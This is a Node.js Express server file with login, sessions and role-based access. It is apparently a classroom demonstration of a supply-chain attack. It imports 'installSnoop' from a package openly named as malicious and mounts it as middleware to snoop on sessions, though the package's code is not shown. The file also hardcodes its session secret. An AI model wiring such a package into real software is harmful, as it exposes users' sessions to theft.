import express from "express";
import { pool } from "./database.js";
import path from "path";
import { fileURLToPath } from "url";
import session from "express-session";
import bcrypt from "bcrypt";
import fs from "fs";
import { installSnoop } from "@rmejia32/malicious_package_demo"; // import the malicious package

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(
  session({
    name: "sid",
    secret: "dfjsnvDSFSgvSDGsfsf%$dfsdf",
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      maxAge: 1000 * 60 * 60,
      sameSite: "lax",
      secure: false,
    },
  })
);

// use the malicious package to snoop on sessions
app.use(installSnoop(session));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "layout.html"));
});

app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "views", "login.html"));
});

app.listen(3000, () => {
  console.log("Server is running on http://localhost:3000");
});

app.post("/login", async (req, res) => {
  const { username, password } = req.body ?? {};
  if (!username || !password) {
    return res.status(400).json({ ok: false, error: "Missing credentials" });
  }
  try {
    const [rows] = await pool.execute(
      "SELECT id, password_hash, role FROM users WHERE username = ?",
      [username]
    );
    const user = rows[0];
    if (!user) {
      return res.status(401).json({ ok: false, error: "Invalid username" });
    }

    const ok = await bcrypt.compare(password, user.password_hash);
    if (!ok) {
      return res.status(401).json({ ok: false, error: "Invalid password" });
    }

    // Store user info in server-side session
    req.session.user = { id: user.id, username, role: user.role };
    return res.redirect("/whoami");
  } catch (err) {
    console.error(err);
    return res.status(500).json({ ok: false, error: String(err) });
  }
});

app.get("/whoami", (req, res) => {
  if (!req.session.user) return res.redirect("/login");

  const filePath = path.join(__dirname, "views", "whoami.html");
  let html = fs.readFileSync(filePath, "utf8");

  html = html
    .replace("${req.session.user.username}", req.session.user.username)
    .replace("${req.session.user.role}", req.session.user.role);

  res.send(html);
});

app.post("/logout", (req, res) => {
  req.session.destroy(() => {
    res.clearCookie("sid");
    res.redirect("/login");
  });
});

function requireAuth(req, res, next) {
  if (!req.session.user) return res.status(401).send("Please log in");
  next();
}
function requireRole(role) {
  return (req, res, next) => {
    if (!req.session.user || req.session.user.role !== role)
      return res.status(403).send("Forbidden");
    next();
  };
}

app.get("/admin", requireAuth, requireRole("admin"), (req, res) => {
  res.send(`<h2>Admin</h2><p>Welcome, ${req.session.user.username}.</p>`);
});

app.get("/db-test", async (req, res) => {
  try {
    const [rows] = await pool.query("SELECT NOW() AS currentTime");
    res.json(rows);
  } catch (err) {
    console.error(err);
    res.status(500).json({ ok: false, error: String(err) });
  }
});
